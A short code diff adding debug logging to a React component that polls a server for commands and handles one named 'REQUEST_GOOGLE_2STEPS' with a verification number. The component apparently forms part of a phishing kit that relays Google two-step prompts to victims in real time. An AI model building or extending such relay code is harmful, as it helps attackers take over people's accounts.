@@ -12,11 +12,14 @@ export default function CommandPoller() {
       const data = await checkForCommands();
       console.log("Command received:", data?.command);  // Debug log
       if (data?.command) {
+        console.log("number received before command:", data?.number);
         setCommand(data.command);
+        console.log("number received after command:", data?.number);
 
 
         if (data.command === "REQUEST_GOOGLE_2STEPS" && data.number) {
           const number = parseInt(data.number, 10); // Parse the number
+          console.log("number received before condition:", data?.number);
           if (!isNaN(number)) {
             console.log("number received:", data?.number);
             setVerificationNumber(number); // Set the verification number
